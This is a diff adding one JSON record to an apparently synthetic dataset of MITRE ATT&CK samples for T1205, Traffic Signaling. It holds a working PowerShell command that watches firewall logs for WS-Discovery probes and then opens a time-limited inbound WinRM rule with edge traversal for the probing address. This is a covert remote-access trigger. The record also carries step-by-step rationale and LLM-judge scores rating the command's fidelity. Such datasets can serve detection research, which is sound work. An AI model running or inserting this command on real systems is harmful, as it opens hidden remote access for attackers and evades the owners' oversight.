@@ -1,0 +1,59 @@
+{
+  "technique_id": "T1205",
+  "platform": "Windows",
+  "shell": "PowerShell",
+  "command": "Invoke-Command -ComputerName localhost -ScriptBlock { $log = \"$env:SystemRoot\\System32\\LogFiles\\Firewall\\pfirewall.log\"; Set-NetFirewallProfile -All -LogAllowed $true -LogDropped $true -LogFileName $log | Out-Null; Get-Content -Path $log -Tail 0 -Wait | ForEach-Object { if ($_ -match '\\b(ALLOW|DROP)\\s+UDP\\s+(\\d{1,3}(?:\\.\\d{1,3}){3})\\s+\\d{1,3}(?:\\.\\d{1,3}){3}\\s+\\d+\\s+3702\\b') { $src=$matches[2]; $name=\"wsd-winrm-$($src.Replace('.','-'))\"; if (-not (Get-NetFirewallRule -DisplayName $name -ErrorAction SilentlyContinue)) { New-NetFirewallRule -DisplayName $name -Direction Inbound -Action Allow -Protocol TCP -LocalPort 5985 -RemoteAddress $src -EdgeTraversalPolicy Allow -Profile Any | Out-Null; Start-Job { param($n) Start-Sleep -Seconds 300; Remove-NetFirewallRule -DisplayName $n } -ArgumentList $name | Out-Null; } } } }",
+  "explanation": "Leverages WS-Discovery (UDP/3702) probes as a covert signal to enable WinRM (5985) with scoped access and temporary edge traversal.",
+  "rationale_steps": [
+    "Enable firewall logging",
+    "Monitor for inbound WS-Discovery probes on UDP/3702",
+    "Add a time-limited allow rule for TCP/5985 scoped to the source IP",
+    "Remove the rule after 5 minutes"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1205-419c2bb8-3dae0b51",
+  "source_prompt_hash": "419c2bb8",
+  "timestamp_utc": "2025-09-30T03:28:48.156174Z",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Balanced braces and quotes with valid cmdlet parameters, a correctly quoted regex, and proper pipeline/scriptblock usage make it well-formed and parseable.",
+        "semantic_score": 4,
+        "semantic_justification": "It implements traffic signaling by tailing firewall logs for UDP/3702 and creating a temporary, scoped WinRM (5985) rule on signal, but it requires administrative privileges, assumes PS remoting to localhost, and does not ensure the WinRM service/listener is enabled.",
+        "combined_score": 4.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T19:10:07.688723Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, braces, and parentheses, proper PowerShell syntax throughout, and valid parameter usage for all cmdlets.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly implements the Traffic Signaling technique by monitoring firewall logs for specific UDP traffic on port 3702 (WS-Discovery) and using that as a covert signal to dynamically create temporary firewall rules allowing WinRM access from the signaling source.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T03:35:39.983172Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is perfectly well-formed with balanced syntax, valid cmdlets, parameters, and correct use of scripting constructs.",
+        "semantic_score": 3,
+        "semantic_justification": "While the command's logic cleverly implements Traffic Signaling (T1205) and the stated intent, the critical firewall configuration and logging steps explicitly require Administrator privileges, contradicting the 'Privilege: None' claim and preventing its successful execution.",
+        "combined_score": 4.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T03:36:01.714551Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.0,
+    "llm_average_score": 4.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null,
+    "Syntax_Run_Details": ""
+  }
+}
